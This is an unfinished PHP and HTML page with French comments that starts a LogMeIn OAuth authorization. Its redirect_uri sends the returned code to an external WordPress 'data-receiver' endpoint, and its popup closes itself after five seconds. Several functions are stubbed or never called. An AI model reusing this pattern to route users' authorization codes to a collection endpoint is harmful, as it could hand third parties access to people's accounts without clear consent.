<?php
if (php_sapi_name() == 'cli') {
    // Exécution en ligne de commande*

    // Récupérer les arguments passés en ligne de commande
    $redirect_uri = isset($argv[1]) ? $argv[1] : null;
    $auth_url = isset($argv[2]) ? $argv[2] : null;

    // Vérifier que les paramètres sont présents
    if ($redirect_uri && $auth_url) {}
}

$authUrl = 'https://authentication.logmeininc.com/oauth/authorize?response_type=code&client_id=d5269c77-22e7-47db-834f-7d89da8b58a0&redirect_uri=http://itsupport.mg/wp-json/data-receiver/v1/submit';

$response = file_get_contents($authUrl);
echo $response;


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentification</title>
</head>
<body>
    <h1>Authentification</h1>
    <p>Veuillez patienter pendant que nous traitons votre demande d'authentification...</p>

    <div id="auth-content"></div>

    <script>
        const authUrl = 'https://authentication.logmeininc.com/oauth/authorize?response_type=code&client_id=d5269c77-22e7-47db-834f-7d89da8b58a0&redirect_uri=http://itsupport.mg/wp-json/data-receiver/v1/submit';

        // Ouvrir une fenêtre pour que l'utilisateur s'authentifie
        function openAuthWindow() {
            const authWindow = window.open(authUrl, '_blank', 'width=600,height=600');

            // Vérifier régulièrement si la fenêtre a été fermée
            const checkWindow = setInterval(() => {
                if (authWindow.closed) {
                    clearInterval(checkWindow);
                    console.log('Fenêtre fermée. Vérifiez si un code d’autorisation a été reçu.');
                    //checkForAuthCode();
                }
            }, 1000);

                  // Fermer la fenêtre automatiquement après 5 secondes
            setTimeout(() => {
                if (!authWindow.closed) {
                    authWindow.close();
                    clearInterval(checkWindow); // Arrêter la vérification
                    console.log('Fenêtre fermée automatiquement après 5 secondes.');
                }
            }, 5000); // Fermeture après 5000 millisecondes (5 secondes)

            }



        // Simuler la vérification de l'URL de redirection pour obtenir le code
        function checkForAuthCode() {
            // Supposons que le code d'autorisation soit dans l'URL (par ex: ?code=1234)
            const urlParams = new URLSearchParams(window.location.search);
            const authCode = urlParams.get('code');

            if (authCode) {
                console.log('Code d’autorisation reçu:', authCode);
            } else {
                console.log('Aucun code d’autorisation reçu.');
            }
        }

        // Lancer le processus d'authentification
        
    </script>
</body>
</html>